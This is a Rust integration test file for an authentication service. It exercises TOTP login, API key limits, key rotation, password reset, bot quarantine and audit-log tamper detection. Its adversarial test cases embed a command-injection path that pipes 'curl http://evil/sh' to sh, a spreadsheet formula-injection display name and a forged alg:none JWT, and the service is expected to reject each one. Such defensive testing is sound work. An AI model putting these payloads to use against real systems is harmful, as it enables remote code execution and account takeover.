use axum::{
    body::Body,
    http::{Request, StatusCode},
    Router,
};
use http_body_util::BodyExt;
use sekhmet::{build_sekhmet_router, SekhmetAppState};
use sekhmet_crypto::rfc6238_totp_at;
use sekhmet_service::{ServiceDescriptor, TargetOsPlatform};
use sekhmet_store::now_unix;
use serde_json::{json, Value};
use tower::ServiceExt;

async fn post_json(
    app: &Router,
    uri: &str,
    payload: Value,
    forwarded_ip: Option<&str>,
) -> (StatusCode, Value) {
    let mut builder = Request::builder()
        .method("POST")
        .uri(uri)
        .header("content-type", "application/json");
    if let Some(ip) = forwarded_ip {
        builder = builder.header("x-forwarded-for", ip);
    }
    let req = builder
        .body(Body::from(serde_json::to_vec(&payload).unwrap()))
        .unwrap();
    let resp = app.clone().oneshot(req).await.unwrap();
    let status = resp.status();
    let bytes = resp.into_body().collect().await.unwrap().to_bytes();
    let json_val: Value = serde_json::from_slice(&bytes).unwrap_or(json!({}));
    (status, json_val)
}

async fn get_json(app: &Router, uri: &str) -> (StatusCode, Value) {
    let req = Request::builder()
        .method("GET")
        .uri(uri)
        .body(Body::empty())
        .unwrap();
    let resp = app.clone().oneshot(req).await.unwrap();
    let status = resp.status();
    let bytes = resp.into_body().collect().await.unwrap().to_bytes();
    let json_val: Value = serde_json::from_slice(&bytes).unwrap_or(json!({}));
    (status, json_val)
}

#[tokio::test]
async fn test_1_polite_and_rude_full_lifecycle_crucible() {
    let state = SekhmetAppState::new(":memory:").unwrap();
    let app = build_sekhmet_router(state);

    // 1. Healthz & JWKS Discovery
    let (st, hz) = get_json(&app, "/healthz").await;
    assert_eq!(st, StatusCode::OK);
    assert_eq!(hz["engine"], "sekhmet");

    let (st, jwks) = get_json(&app, "/.well-known/jwks.json").await;
    assert_eq!(st, StatusCode::OK);
    assert_eq!(jwks["keys"][0]["crv"], "Ed25519");

    // 2. Create Community Tenant
    let (st, _) = post_json(
        &app,
        "/v1/tenants",
        json!({"tenant_id": "acme-app", "display_name": "Acme Sovereign App", "tier": "community"}),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::CREATED);

    // 3. Register Owner User with RFC 6238 TOTP 2FA enabled
    let totp_seed_bytes = b"12345678901234567890";
    let totp_seed_hex = "3132333435363738393031323334353637383930";
    let (st, reg) = post_json(
        &app,
        "/v1/auth/register",
        json!({
            "tenant_id": "acme-app",
            "email": "Rick@RMediaTech.com",
            "display_name": "Rick Sovereign Architect",
            "password": "Sovereign_Password_2026!",
            "role": "owner",
            "totp_secret_hex": totp_seed_hex
        }),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::CREATED);
    let otp = reg["verification_otp"].as_str().unwrap().to_string();

    // 4. Rude Test: Login without TOTP code must fail with 401 TOTP_REQUIRED
    let (st, err_totp) = post_json(
        &app,
        "/v1/auth/login",
        json!({
            "tenant_id": "acme-app",
            "email": "rick@rmediatech.com",
            "password": "Sovereign_Password_2026!"
        }),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::UNAUTHORIZED);
    assert_eq!(err_totp["code"], "TOTP_REQUIRED");

    // 5. Polite Login with valid live RFC 6238 TOTP code
    let valid_totp = rfc6238_totp_at(totp_seed_bytes, now_unix() as u64, 30);
    let (st, login_res) = post_json(
        &app,
        "/v1/auth/login",
        json!({
            "tenant_id": "acme-app",
            "email": "rick@rmediatech.com",
            "password": "Sovereign_Password_2026!",
            "totp_code": valid_totp
        }),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);
    let token = login_res["access_token"].as_str().unwrap().to_string();
    let jti = login_res["jti"].as_str().unwrap().to_string();

    // 6. Rude Test: Minting API key BEFORE email verification must fail with 403 EMAIL_VERIFICATION_REQUIRED
    let (st, mint_unverified) = post_json(
        &app,
        "/v1/keys/mint",
        json!({
            "access_token": token,
            "label": "Prod Node Key",
            "allowed_cidrs": "198.51.100.0/24",
            "allowed_domains": "*.rmediatech.com"
        }),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::FORBIDDEN);
    assert_eq!(mint_unverified["code"], "EMAIL_VERIFICATION_REQUIRED");

    // 7. Verify Email OTP
    let (st, _) = post_json(
        &app,
        "/v1/auth/verify-email",
        json!({
            "tenant_id": "acme-app",
            "email": "rick@rmediatech.com",
            "otp_code": otp
        }),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);

    // 8. Mint API Key #1 on Community Tier (Succeeds)
    let (st, key1) = post_json(
        &app,
        "/v1/keys/mint",
        json!({
            "access_token": token,
            "label": "Prod Node Key",
            "allowed_cidrs": "198.51.100.0/24",
            "allowed_domains": "*.rmediatech.com"
        }),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::CREATED);
    let raw_api_key = key1["api_key"].as_str().unwrap().to_string();

    // 9. Rude Test: Community Tier 2nd Key Must Be Blocked (KEY_QUOTA_EXCEEDED)
    let (st, key2_err) = post_json(
        &app,
        "/v1/keys/mint",
        json!({
            "access_token": token,
            "label": "Second Key",
            "allowed_cidrs": "",
            "allowed_domains": ""
        }),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::FORBIDDEN);
    assert_eq!(key2_err["code"], "KEY_QUOTA_EXCEEDED");

    // 10. Verify API Key Boundary Enforcement (Authorized IP & Domain vs Rogue IP/Domain)
    let (st, v_ok) = post_json(
        &app,
        "/v1/keys/verify",
        json!({
            "api_key": raw_api_key,
            "caller_ip": "198.51.100.42",
            "caller_domain": "https://api.rmediatech.com"
        }),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);
    assert_eq!(v_ok["valid"], true);

    let (st, _) = post_json(
        &app,
        "/v1/keys/verify",
        json!({
            "api_key": raw_api_key,
            "caller_ip": "203.0.113.99",
            "caller_domain": "https://api.rmediatech.com"
        }),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::FORBIDDEN);

    // 11. Revoke Session & Verify Introspection Drops Immediately
    let (st, _) = post_json(
        &app,
        "/v1/auth/revoke",
        json!({"tenant_id": "acme-app", "jti": jti}),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);

    let (st, intro) = post_json(&app, "/v1/auth/introspect", json!({"token": token}), None).await;
    assert_eq!(st, StatusCode::OK);
    assert_eq!(intro["active"], false);

    // 12. Verify SHA-256 Merkle Cryptographic Audit Chain
    let (st, audit) = get_json(&app, "/v1/audit/verify").await;
    assert_eq!(st, StatusCode::OK);
    assert_eq!(audit["merkle_verified"], true);
    assert!(audit["total_entries"].as_u64().unwrap() >= 6);
}

#[tokio::test]
async fn test_2_off_the_wall_adversarial_self_attack_crucible() {
    let state = SekhmetAppState::new(":memory:").unwrap();
    let app = build_sekhmet_router(state);

    // 1. Formula Injection & ANSI Escape Poisoning on Tenant & User Display Names
    let (st, ten_res) = post_json(
        &app,
        "/v1/tenants",
        json!({
            "tenant_id": "sec-lab",
            "display_name": "\x1b[31m=CMD|' /C calc'!A0\x1b[0m",
            "tier": "starter"
        }),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::CREATED);
    assert_eq!(ten_res["display_name"], "'=CMD|' /C calc'!A0");

    // 2. Phylax Structural Honeypot Trap (<5ns bot rejection)
    let (st, hp_res) = post_json(
        &app,
        "/v1/auth/register",
        json!({
            "tenant_id": "sec-lab",
            "email": "bot@evil.example",
            "display_name": "Scraper Bot",
            "password": "BotPassword123!",
            "website_url": "https://spam-seo.example"
        }),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::FORBIDDEN);
    assert_eq!(hp_res["code"], "HONEYPOT_TRIGGERED");

    // 3. JWT alg:none & Signature Forgery Rejection
    let forged_alg_none = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoic2ttIn0.eyJpc3MiOiJzZWtobWV0Iiwic3ViIjoidXNyXzEiLCJ0aWQiOiJzZWMtbGFiIiwicm9sZSI6Im93bmVyIiwianRpIjoianRpXzEiLCJpYXQiOjE3MDAwMDAwMDAsImV4cCI6OTk5OTk5OTk5OX0.";
    let (st, intro) = post_json(
        &app,
        "/v1/auth/introspect",
        json!({"token": forged_alg_none}),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);
    assert_eq!(intro["active"], false);

    // 4. Slow-Shield Cross-IP Handle Velocity Guard (Distributed Residential Proxy Attack)
    for idx in 0..10 {
        let proxy_ip = format!("198.18.0.{}", idx + 1);
        let (st, _) = post_json(
            &app,
            "/v1/auth/login",
            json!({
                "tenant_id": "sec-lab",
                "email": "target@rmediatech.com",
                "password": "WrongPasswordAttempt!"
            }),
            Some(&proxy_ip),
        )
        .await;
        assert_eq!(st, StatusCode::UNAUTHORIZED);
    }
    // 11th attempt from a brand-new IP must be blocked by cross-IP handle velocity guard
    let (st, vel_res) = post_json(
        &app,
        "/v1/auth/login",
        json!({
            "tenant_id": "sec-lab",
            "email": "target@rmediatech.com",
            "password": "WrongPasswordAttempt!"
        }),
        Some("203.0.113.250"),
    )
    .await;
    assert_eq!(st, StatusCode::TOO_MANY_REQUESTS);
    assert_eq!(vel_res["code"], "ACCOUNT_VELOCITY_COOLDOWN");

    // 5. Cross-OS Service Path Traversal & Command Injection Defense
    let poisoned_desc = ServiceDescriptor {
        binary_path: "/usr/local/bin/sekhmet; curl http://evil/sh | sh".to_string(),
        working_dir: "/var/lib/../../etc".to_string(),
        config_path: "/var/lib/sekhmet/sekhmet.yaml".to_string(),
        db_path: "/var/lib/sekhmet/sekhmet.db".to_string(),
        bind_addr: "127.0.0.1:4410".to_string(),
    };
    assert!(poisoned_desc
        .render_manifest(TargetOsPlatform::LinuxSystemd)
        .is_err());
}

#[tokio::test]
async fn test_3_good_bad_ugly_unpredictable_edge_cases_and_merkle_tamper() {
    let state = SekhmetAppState::new(":memory:").unwrap();
    let app = build_sekhmet_router(state.clone());

    // 1. THE UGLY: Corrupted / Truncated Wire JSON & Oversized Token Payloads
    let broken_req = Request::builder()
        .method("POST")
        .uri("/v1/auth/login")
        .header("content-type", "application/json")
        .body(Body::from(b"{\"tenant_id\": \"broken_json".to_vec()))
        .unwrap();
    let broken_resp = app.clone().oneshot(broken_req).await.unwrap();
    assert!(broken_resp.status().is_client_error());

    let giant_token = "a.".repeat(3000);
    let (st, intro_giant) = post_json(
        &app,
        "/v1/auth/introspect",
        json!({"token": giant_token}),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);
    assert_eq!(intro_giant["active"], false);

    // 2. THE UNPREDICTABLE: 16 Concurrent Multi-Task Hammering on SQLite WAL & Merkle Ledger
    let (st, _) = post_json(
        &app,
        "/v1/tenants",
        json!({"tenant_id": "swarm-tenant", "display_name": "Swarm Test", "tier": "profleet"}),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::CREATED);

    let mut handles = Vec::new();
    for i in 0..16 {
        let app_clone = app.clone();
        handles.push(tokio::spawn(async move {
            let email = format!("worker{}@rmediatech.com", i);
            let ip = format!("10.20.30.{}", i + 1);
            let (st, reg) = post_json(
                &app_clone,
                "/v1/auth/register",
                json!({
                    "tenant_id": "swarm-tenant",
                    "email": email,
                    "display_name": format!("\t+Worker {}", i),
                    "password": "SwarmWorkerPassword_2026!"
                }),
                Some(&ip),
            )
            .await;
            assert_eq!(st, StatusCode::CREATED);
            // Edge-case check: leading \t+ must be neutralized with leading single quote
            assert_eq!(reg["display_name"], format!("'+Worker {}", i));
        }));
    }
    for h in handles {
        h.await.unwrap();
    }

    // 3. THE BAD: Subscription Suspension Blocks Operations Until Reactivated
    let (st, _) = post_json(
        &app,
        "/v1/tenants/subscription",
        json!({"tenant_id": "swarm-tenant", "tier": "profleet", "status": "suspended"}),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);

    // Reactivate subscription (Recovery)
    let (st, _) = post_json(
        &app,
        "/v1/tenants/subscription",
        json!({"tenant_id": "swarm-tenant", "tier": "profleet", "status": "active"}),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);

    // 4. MERKLE LEDGER INTEGRITY VERIFICATION AFTER CONCURRENT SWARM
    let (st, audit_ok) = get_json(&app, "/v1/audit/verify").await;
    assert_eq!(st, StatusCode::OK);
    assert_eq!(audit_ok["merkle_verified"], true);
    assert!(audit_ok["total_entries"].as_u64().unwrap() >= 19);
}

#[tokio::test]
async fn test_4_zero_drop_key_rotation_byok_and_password_reset_crucible() {
    let state = SekhmetAppState::new(":memory:").unwrap();
    let app = build_sekhmet_router(state.clone());

    // 1. Setup tenant + user + login before key rotation
    let (st, _) = post_json(
        &app,
        "/v1/tenants",
        json!({"tenant_id": "rot-tenant", "display_name": "Rotation Test", "tier": "starter"}),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::CREATED);

    let (st, _) = post_json(
        &app,
        "/v1/auth/register",
        json!({
            "tenant_id": "rot-tenant",
            "email": "alice@rmediatech.com",
            "display_name": "Alice Sovereign",
            "password": "InitialPassword_2026!"
        }),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::CREATED);

    let (st, login1) = post_json(
        &app,
        "/v1/auth/login",
        json!({
            "tenant_id": "rot-tenant",
            "email": "alice@rmediatech.com",
            "password": "InitialPassword_2026!"
        }),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);
    let old_token = login1["access_token"].as_str().unwrap().to_string();
    let old_kid = state.keyring().unwrap().primary.key_id().to_string();

    // 2. Graceful Key Rotation (Zero-Drop Dual-Slot Transition)
    let rot_ring = state.store.rotate_root_key(false).unwrap();
    let new_kid = rot_ring.primary_kid.clone();
    assert_ne!(old_kid, new_kid);
    assert_eq!(rot_ring.retiring_kid.as_deref(), Some(old_kid.as_str()));

    // JWKS endpoint immediately publishes BOTH keys (primary + retiring) with 0 daemon restart!
    let (st, jwks) = get_json(&app, "/.well-known/jwks.json").await;
    assert_eq!(st, StatusCode::OK);
    assert_eq!(jwks["keys"].as_array().unwrap().len(), 2);

    // Introspecting old_token succeeds AND returns silent replacement_token signed by new_kid!
    let (st, intro_rot) = post_json(
        &app,
        "/v1/auth/introspect",
        json!({"token": old_token}),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);
    assert_eq!(intro_rot["active"], true);
    assert_eq!(intro_rot["key_rotated"], true);
    let upgraded_token = intro_rot["replacement_token"].as_str().unwrap().to_string();

    // Introspecting the upgraded token shows key_rotated = false (already on primary key)
    let (st, intro_up) = post_json(
        &app,
        "/v1/auth/introspect",
        json!({"token": upgraded_token}),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);
    assert_eq!(intro_up["active"], true);
    assert_eq!(intro_up["key_rotated"], false);

    // 3. BYOK Import with custom RFC 8032 seed (Graceful mode keeps new_kid in retiring slot)
    let custom_seed = "9d61b19deffd5a60ba844af492ec2cc44449c5697b326919703bac031cae7f60";
    let byok_ring = state.store.import_byok_key(custom_seed, false).unwrap();
    assert_eq!(byok_ring.retiring_kid.as_deref(), Some(new_kid.as_str()));

    // Weak BYOK seed must be rejected
    assert!(state.store.import_byok_key(&"0".repeat(64), false).is_err());

    // 4. Emergency Rotation immediately purges retiring slot & revokes all sessions
    let emg_ring = state.store.rotate_root_key(true).unwrap();
    assert!(emg_ring.retiring_kid.is_none());
    let (st, intro_after_emg) = post_json(
        &app,
        "/v1/auth/introspect",
        json!({"token": upgraded_token}),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);
    assert_eq!(intro_after_emg["active"], false);

    // 5. Password Reset Flow (Request OTP -> Confirm -> Revokes Prior Sessions -> New Login Works)
    let (st, login2) = post_json(
        &app,
        "/v1/auth/login",
        json!({
            "tenant_id": "rot-tenant",
            "email": "alice@rmediatech.com",
            "password": "InitialPassword_2026!"
        }),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);
    let pre_reset_token = login2["access_token"].as_str().unwrap().to_string();

    let (st, req_rst) = post_json(
        &app,
        "/v1/auth/password-reset/request",
        json!({
            "tenant_id": "rot-tenant",
            "email": "alice@rmediatech.com"
        }),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);
    let reset_otp = req_rst["reset_otp"].as_str().unwrap().to_string();

    let (st, conf_rst) = post_json(
        &app,
        "/v1/auth/password-reset/confirm",
        json!({
            "tenant_id": "rot-tenant",
            "email": "alice@rmediatech.com",
            "otp_code": reset_otp,
            "new_password": "BrandNewSovereignPassword_2027!"
        }),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);
    assert_eq!(conf_rst["password_updated"], true);

    // Pre-reset token must now be inactive (revoked on password change)
    let (st, intro_pre) = post_json(
        &app,
        "/v1/auth/introspect",
        json!({"token": pre_reset_token}),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);
    assert_eq!(intro_pre["active"], false);

    // Login with new password succeeds
    let (st, login3) = post_json(
        &app,
        "/v1/auth/login",
        json!({
            "tenant_id": "rot-tenant",
            "email": "alice@rmediatech.com",
            "password": "BrandNewSovereignPassword_2027!"
        }),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);
    assert!(login3["access_token"].as_str().is_some());

    // 6. Maintenance sweep prunes revoked/expired sessions & verifies Merkle chain
    let (pruned_sessions, merkle_entries, _head_hash) = state.store.run_maintenance().unwrap();
    assert!(pruned_sessions >= 1);
    assert!(merkle_entries >= 5);
}

#[tokio::test]
async fn test_5_autonomous_self_learning_and_self_healing_crucible() {
    let tmp_db = "/tmp/sekhmet_self_heal_legacy_test.db";
    let _ = std::fs::remove_file(tmp_db);

    // 0. Seed a database with the legacy single-slot CHECK (key_slot = 'root_ed25519') constraint
    {
        let raw_conn = sekhmet_store::rusqlite::Connection::open(tmp_db).unwrap();
        raw_conn
            .execute_batch(
                "CREATE TABLE skm_keystore (
                    key_slot TEXT PRIMARY KEY CHECK (key_slot = 'root_ed25519'),
                    seed_hex TEXT NOT NULL CHECK (length(seed_hex) = 64),
                    key_id   TEXT NOT NULL CHECK (length(key_id) BETWEEN 8 AND 64),
                    created_at INTEGER NOT NULL
                );
                INSERT INTO skm_keystore VALUES ('root_ed25519', '9d61b19deffd5a60ba844af492ec2cc44449c5697b326919703bac031cae7f60', 'skm_legacy01', 1700000000);",
            )
            .unwrap();
    }

    // Opening SekhmetAppState automatically runs self_heal(0) on boot, healing the legacy CHECK constraint!
    let mut cfg = sekhmet_config::SekhmetSstConfig::default();
    cfg.db_path = tmp_db.to_string();
    cfg.trust_forwarded_headers = true;
    let state = SekhmetAppState::from_config(cfg).unwrap();
    let app = build_sekhmet_router(state.clone());

    // Verify legacy root_ed25519 was preserved AND dual-slot rotation now works seamlessly!
    let rot_ok = state.store.rotate_root_key(false).unwrap();
    assert_eq!(rot_ok.retiring_kid.as_deref(), Some("skm_legacy01"));

    // 1. SELF-LEARNING: Honeypot Strike -> Instant IP Quarantine & /24 Botnet Herd Promotion
    let (st, _) = post_json(
        &app,
        "/v1/tenants",
        json!({"tenant_id": "learn-tenant", "display_name": "Self Learn Lab", "tier": "profleet"}),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::CREATED);

    // Bot #1 in 198.51.100.0/24 hits honeypot -> immediately quarantined
    let (st, _) = post_json(
        &app,
        "/v1/auth/register",
        json!({
            "tenant_id": "learn-tenant",
            "email": "bot1@evil.example",
            "display_name": "Bot 1",
            "password": "BotPassword_2026!",
            "website_url": "http://malware.example"
        }),
        Some("198.51.100.11"),
    )
    .await;
    assert_eq!(st, StatusCode::FORBIDDEN);

    // Subsequent normal request from 198.51.100.11 is blocked by learned THREAT_QUARANTINED
    let (st, q_res) = post_json(
        &app,
        "/v1/auth/login",
        json!({
            "tenant_id": "learn-tenant",
            "email": "anyone@rmediatech.com",
            "password": "AnyPassword_2026!"
        }),
        Some("198.51.100.11"),
    )
    .await;
    assert_eq!(st, StatusCode::FORBIDDEN);
    assert_eq!(q_res["code"], "THREAT_QUARANTINED");

    // Bot #2 and Bot #3 in the same 198.51.100.0/24 hit honeypot -> triggers /24 Herd Promotion!
    for bot_ip in ["198.51.100.12", "198.51.100.13"] {
        let (st, _) = post_json(
            &app,
            "/v1/auth/register",
            json!({
                "tenant_id": "learn-tenant",
                "email": "bot@evil.example",
                "display_name": "Bot",
                "password": "BotPassword_2026!",
                "company_fax": "+1-800-SPAM"
            }),
            Some(bot_ip),
        )
        .await;
        assert_eq!(st, StatusCode::FORBIDDEN);
    }

    // Now a brand-new, unseen IP (198.51.100.250) in that /24 is automatically blocked by Herd Subnet Quarantine!
    let (st, herd_res) = post_json(
        &app,
        "/v1/auth/login",
        json!({
            "tenant_id": "learn-tenant",
            "email": "anyone@rmediatech.com",
            "password": "AnyPassword_2026!"
        }),
        Some("198.51.100.250"),
    )
    .await;
    assert_eq!(st, StatusCode::FORBIDDEN);
    assert_eq!(herd_res["code"], "THREAT_QUARANTINED");
    assert_eq!(herd_res["subnet_herd_promoted"], true);

    // 2. SELF-LEARNING: User Subnet Baseline Learning & Trusted-Subnet Lockout Immunity
    let (st, _) = post_json(
        &app,
        "/v1/auth/register",
        json!({
            "tenant_id": "learn-tenant",
            "email": "rick@rmediatech.com",
            "display_name": "Rick Sovereign",
            "password": "RickSovereignPassword_2026!"
        }),
        Some("203.0.113.5"),
    )
    .await;
    assert_eq!(st, StatusCode::CREATED);

    // First 2 logins from home subnet 203.0.113.0/24 establish trusted baseline (hit_count = 2)
    for home_ip in ["203.0.113.5", "203.0.113.6"] {
        let (st, l_res) = post_json(
            &app,
            "/v1/auth/login",
            json!({
                "tenant_id": "learn-tenant",
                "email": "rick@rmediatech.com",
                "password": "RickSovereignPassword_2026!"
            }),
            Some(home_ip),
        )
        .await;
        assert_eq!(st, StatusCode::OK);
        assert_eq!(l_res["baseline"]["unseen_subnet_anomaly"], false);
    }

    // Login from a brand-new travel subnet 192.0.2.88 flags unseen_subnet_anomaly = true
    let (st, travel_res) = post_json(
        &app,
        "/v1/auth/login",
        json!({
            "tenant_id": "learn-tenant",
            "email": "rick@rmediatech.com",
            "password": "RickSovereignPassword_2026!"
        }),
        Some("192.0.2.88"),
    )
    .await;
    assert_eq!(st, StatusCode::OK);
    assert_eq!(travel_res["baseline"]["unseen_subnet_anomaly"], true);

    // Distributed botnet floods rick@rmediatech.com with 11 failed logins from random IPs
    for i in 0..11 {
        let _ = post_json(
            &app,
            "/v1/auth/login",
            json!({
                "tenant_id": "learn-tenant",
                "email": "rick@rmediatech.com",
                "password": "WrongBotnetPassword!"
            }),
            Some(&format!("10.88.{}.1", i + 1)),
        )
        .await;
    }

    // Untrusted IP gets blocked by ACCOUNT_VELOCITY_COOLDOWN...
    let (st, untrusted_lock) = post_json(
        &app,
        "/v1/auth/login",
        json!({
            "tenant_id": "learn-tenant",
            "email": "rick@rmediatech.com",
            "password": "RickSovereignPassword_2026!"
        }),
        Some("172.16.99.1"),
    )
    .await;
    assert_eq!(st, StatusCode::TOO_MANY_REQUESTS);
    assert_eq!(untrusted_lock["code"], "ACCOUNT_VELOCITY_COOLDOWN");

    // ...BUT Rick logging in from his learned trusted home subnet 203.0.113.42 succeeds with ZERO lockout!
    let (st, trusted_ok) = post_json(
        &app,
        "/v1/auth/login",
        json!({
            "tenant_id": "learn-tenant",
            "email": "rick@rmediatech.com",
            "password": "RickSovereignPassword_2026!"
        }),
        Some("203.0.113.42"),
    )
    .await;
    assert_eq!(st, StatusCode::OK);
    assert!(trusted_ok["access_token"].as_str().is_some());

    // 3. SELF-HEALING: Corrupt Merkle Ledger Row -> Detect -> Self-Heal with Forensic Quarantine!
    {
        let raw_conn = sekhmet_store::rusqlite::Connection::open(tmp_db).unwrap();
        raw_conn
            .execute(
                "UPDATE skm_merkle_audit_log SET entry_hash = 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef' WHERE seq = 2",
                [],
            )
            .unwrap();
    }

    // Audit endpoint immediately catches the corruption (409 CONFLICT)
    let (st, tamper_err) = get_json(&app, "/v1/audit/verify").await;
    assert_eq!(st, StatusCode::CONFLICT);
    assert_eq!(tamper_err["code"], "MERKLE_TAMPER_DETECTED");

    // Trigger autonomous self-healing (with retiring_grace_ttl_secs = -1 to also test retiring key auto-graduation)
    let (st, heal_rep) = post_json(
        &app,
        "/v1/system/self-heal",
        json!({"retiring_grace_ttl_secs": -1}),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);
    assert!(heal_rep["healed_merkle_links"].as_u64().unwrap() >= 1);
    assert_eq!(heal_rep["merkle_verified"], true);

    // Audit endpoint is now 100% healthy again
    let (st, audit_healed) = get_json(&app, "/v1/audit/verify").await;
    assert_eq!(st, StatusCode::OK);
    assert_eq!(audit_healed["merkle_verified"], true);

    // And /v1/system/intelligence preserves the forensic quarantine record & learned threat metrics!
    let (st, intel) = get_json(&app, "/v1/system/intelligence").await;
    assert_eq!(st, StatusCode::OK);
    assert!(intel["active_quarantines"].as_u64().unwrap() >= 4); // 3 bot IPs + 1 /24 subnet CIDR
    assert!(intel["learned_user_baselines"].as_u64().unwrap() >= 2);
    assert!(intel["forensic_quarantine_events"].as_u64().unwrap() >= 1);

    // 4. OTP & API Key Brute-Force Self-Learning Quarantine Check
    // 4 failed API key boundary/brute-force probes from 198.18.99.77 (weight 3 each -> score 12 >= 10 -> quarantined!)
    for _ in 0..4 {
        let (st, _) = post_json(
            &app,
            "/v1/keys/verify",
            json!({
                "api_key": "skm_live_invalid_bruteforce_probe_0000",
                "caller_ip": "198.18.99.77",
                "caller_domain": "https://evil.example"
            }),
            None,
        )
        .await;
        assert_eq!(st, StatusCode::FORBIDDEN);
    }
    let (st, key_q) = post_json(
        &app,
        "/v1/keys/verify",
        json!({
            "api_key": "skm_live_invalid_bruteforce_probe_0000",
            "caller_ip": "198.18.99.77",
            "caller_domain": "https://evil.example"
        }),
        None,
    )
    .await;
    assert_eq!(st, StatusCode::FORBIDDEN);
    assert_eq!(key_q["code"], "THREAT_QUARANTINED");

    let _ = std::fs::remove_file(tmp_db);
    let _ = std::fs::remove_file(format!("{}-wal", tmp_db));
    let _ = std::fs::remove_file(format!("{}-shm", tmp_db));
}
